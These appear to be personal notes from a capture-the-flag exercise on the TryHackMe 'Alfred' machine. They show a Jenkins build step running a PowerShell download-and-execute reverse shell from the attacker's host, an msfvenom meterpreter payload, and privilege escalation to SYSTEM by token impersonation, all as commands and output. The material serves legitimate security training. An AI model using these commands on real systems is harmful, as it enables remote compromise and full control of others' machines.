### Exploiting Jenkins ###
        #Jenkins = continuous integration/development pipelines

### Initial Access - Nishang [reverse shell scripts] ###
(kali㉿kali)-[~/THM/practice/alfred]
└─$ nmap -sT -sV 10.10.131.14
Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-04 12:17 EST
Stats: 0:01:27 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 100.00% done; ETC: 12:19 (0:00:00 remaining)
Nmap scan report for 10.10.131.14
Host is up (0.020s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE            VERSION
80/tcp   open  http               Microsoft IIS httpd 7.5
3389/tcp open  ssl/ms-wbt-server?
8080/tcp open  http               Jetty 9.4.z-SNAPSHOT
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 87.32 seconds
# TCP ports open = 3 
# uname + password = admin + admin 

# found on http://10.10.131.14:
RIP Bruce Wayne

Donations to alfred@wayneenterprises.com are greatly appreciated. 

# found under builds:
SuccessConsole Output

Started by user admin
Running as SYSTEM
Building in workspace C:\Program Files (x86)\Jenkins\workspace\project
[project] $ cmd /c call C:\Users\bruce\AppData\Local\Temp\jenkins8034204804437582227.bat

C:\Program Files (x86)\Jenkins\workspace\project>whoami
alfred\bruce

C:\Program Files (x86)\Jenkins\workspace\project>exit 0 
Finished: SUCCESS


# feature of tool allowig executing commands = 
        # this will be used to get a reverse shell: new item > pipeline 
# shell to use = Invoke-PowerShellTCP.ps1

#1 create a new build

#2 chose the free project option
#3 Execute Windows Bash command
#4 start a simpleHTTPwebserver  [python3 -m http.server can also be used]
(kali㉿kali)-[~/…/practice/alfred/nishang/Shells]
└─$ python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
#5 enter the following commands:
powershell iex (New-Object Net.WebClient).DownloadString('http://10.11.59.68:80/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.11.59.68 -Port 9999
#6 set up listener:
(kali㉿kali)-[~/THM/practice/alfred]
└─$ nc -lvnp 9999
listening on [any] 9999 ...
#7 save + 'Build" to execute code
#8 enjoy reverse shell:
(kali㉿kali)-[~/THM/practice/alfred]
└─$ nc -lvnp 9999
listening on [any] 9999 ...
connect to [10.11.59.68] from (UNKNOWN) [10.10.131.14] 49223
Windows PowerShell running as user bruce on ALFRED
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Program Files (x86)\Jenkins\workspace\reverse>









### Switching Shells - getting meterpreter shell using web_delivery ###
#1 create payload
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.8.3.38 LPORT=4433 -f exe -o reverse.exe

(kali㉿kali)-[~/THM/practice/alfred]
└─$ msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.11.59.68 LPORT=4433 -f exe -o reverse.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 381 (iteration=0)
x86/shikata_ga_nai chosen with final size 381
Payload size: 381 bytes
Final size of exe file: 73802 bytes
Saved as: reverse.exe
#2 run metasploit
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.11.59.68
LHOST => 10.11.59.68
msf6 exploit(multi/handler) > set LPORT 4433
LPORT => 4433
msf6 exploit(multi/handler) > run -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
msf6 exploit(multi/handler) > 
[*] Started reverse TCP handler on 10.11.59.68:4433
#3 upload reverse.exe to the victim machine
PS C:\users\bruce\desktop> powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.11.59.68:80/reverse.exe','reverse.exe')"
#4 start the process
PS C:\users\bruce\desktop> Start-Process "reverse.exe"
        # --> no meterpreter session started... I realised I had used the wrong LHOST in the payload
#5 get a meterpreter
msf6 exploit(multi/handler) > [*] Meterpreter session 3 opened (10.11.59.68:4433 -> 10.10.88.222:49270) at 2022-02-06 05:07:29 -0500
        #(I put the new one in \users\bruce\Downloads\)
#6 start the session meterpreter:
msf6 exploit(multi/handler) > sessions 4
[*] Starting interaction with 4...










### PRIVESC TIME ###
#1
PS C:\users\bruce\Downloads> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                  Description                               State   
=============================== ========================================= ========
SeDebugPrivilege                Debug programs                            Enabled 
SeSystemEnvironmentPrivilege    Modify firmware environment values        Disabled
SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled 
SeRemoteShutdownPrivilege       Force shutdown from a remote system       Disabled
SeUndockPrivilege               Remove computer from docking station      Disabled
SeManageVolumePrivilege         Perform volume maintenance tasks          Disabled
SeImpersonatePrivilege          Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege         Create global objects                     Enabled
        # these were the only enabled ones
#2 load incognito mode in meterpeter shell
meterpreter > load incognito
Loading extension incognito...Success.
#3 
meterpreter > list_tokens -g
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM

Delegation Tokens Available
========================================
\
#-->this the one were interested in
BUILTIN\Administrators
BUILTIN\Users
NT AUTHORITY\Authenticated Users
NT AUTHORITY\NTLM Authentication
NT AUTHORITY\SERVICE 
NT AUTHORITY\This Organization
NT AUTHORITY\WRITE RESTRICTED
NT SERVICE\AppHostSvc
NT SERVICE\AudioEndpointBuilder
NT SERVICE\BFE
NT SERVICE\CertPropSvc
NT SERVICE\CscService
NT SERVICE\Dnscache
NT SERVICE\eventlog
NT SERVICE\EventSystem
NT SERVICE\FDResPub
NT SERVICE\iphlpsvc
NT SERVICE\LanmanServer
NT SERVICE\MMCSS
NT SERVICE\PcaSvc
NT SERVICE\PlugPlay
NT SERVICE\RpcEptMapper
NT SERVICE\Schedule
NT SERVICE\SENS
NT SERVICE\SessionEnv
NT SERVICE\Spooler
NT SERVICE\TrkWks
NT SERVICE\TrustedInstaller
NT SERVICE\UmRdpService
NT SERVICE\UxSms
NT SERVICE\Winmgmt
NT SERVICE\WSearch
NT SERVICE\wuauserv

Impersonation Tokens Available
========================================
NT AUTHORITY\NETWORK
NT SERVICE\AudioSrv
NT SERVICE\DcomLaunch
NT SERVICE\Dhcp
NT SERVICE\DPS
NT SERVICE\lmhosts
NT SERVICE\MpsSvc
NT SERVICE\netprofm
NT SERVICE\nsi
NT SERVICE\PolicyAgent
NT SERVICE\Power
NT SERVICE\ShellHWDetection
NT SERVICE\W32Time
NT SERVICE\WdiServiceHost
NT SERVICE\WinHttpAutoProxySvc
NT SERVICE\wscsvc
#4 impersonate the token
meterpreter > impersonate_token "BUILTIN\Administrators"
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM
[+] Delegation token available
[+] Successfully impersonated user NT AUTHORITY\SYSTEM

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
#5 migrate to any process which has the NT AUTHORITY\SYSTEM user
meterpreter > getpid
Current pid: 2948
meterpreter > ps

Process List
============

 PID   PPID  Name                 Arch  Session  User                          Path
 ---   ----  ----                 ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System               x64   0
 396   4     smss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\smss.exe
 524   516   csrss.exe            x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
 572   564   csrss.exe            x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
 580   516   wininit.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wininit.exe
 608   564   winlogon.exe         x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe
 668   580   services.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\services.exe
 676   580   lsass.exe            x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe
 684   580   lsm.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsm.exe
 772   668   svchost.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 848   668   svchost.exe          x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 920   608   LogonUI.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\LogonUI.exe
 936   668   svchost.exe          x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 992   668   svchost.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1012  668   svchost.exe          x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1016  668   svchost.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1064  668   svchost.exe          x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 1208  668   spoolsv.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 1216  1812  cmd.exe              x86   0        alfred\bruce                  C:\Windows\SysWOW64\cmd.exe
 1236  668   svchost.exe          x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1340  668   amazon-ssm-agent.ex  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-
             e                                                                 agent.exe
 1376  2284  reverse.exe          x86   0        alfred\bruce                  C:\Users\bruce\Downloads\reverse.exe
 1392  668   svchost.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1420  668   LiteAgent.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Xentools\LiteAg
                                                                               ent.exe
 1448  668   svchost.exe          x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1608  668   jenkins.exe          x64   0        alfred\bruce                  C:\Program Files (x86)\Jenkins\jenkins.
                                                                               exe
 1700  668   svchost.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1784  668   svchost.exe          x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 1812  1608  java.exe             x86   0        alfred\bruce                  C:\Program Files (x86)\Jenkins\jre\bin\
                                                                               java.exe
 1828  668   Ec2Config.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Ec2ConfigServic
                                                                               e\Ec2Config.exe
 1924  524   conhost.exe          x64   0        alfred\bruce                  C:\Windows\System32\conhost.exe
 2080  524   conhost.exe          x64   0        alfred\bruce                  C:\Windows\System32\conhost.exe
 2284  1216  powershell.exe       x86   0        alfred\bruce                  C:\Windows\SysWOW64\WindowsPowerShell\v
                                                                               1.0\powershell.exe
 2372  772   WmiPrvSE.exe         x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\wbem\WmiPrvSE.exe
 2716  668   sppsvc.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\sppsvc.exe
 2776  668   svchost.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 2924  668   SearchIndexer.exe    x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\SearchIndexer.exe
 2948  2284  reverse.exe          x86   0        alfred\bruce                  C:\Users\bruce\Downloads\reverse.exe
 3036  668   TrustedInstaller.ex  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\servicing\TrustedInstaller.e
             e                                                                 xe

meterpreter > migrate 668
[*] Migrating from 2948 to 668...
[*] Migration completed successfully.
#6 read root flag?
        #cd Windows\System32\config
        #cat root.txt
cat C:/Windows/System32/config/root.txt
        #finally!!
dff0f748678f280250f25a45b8046b4a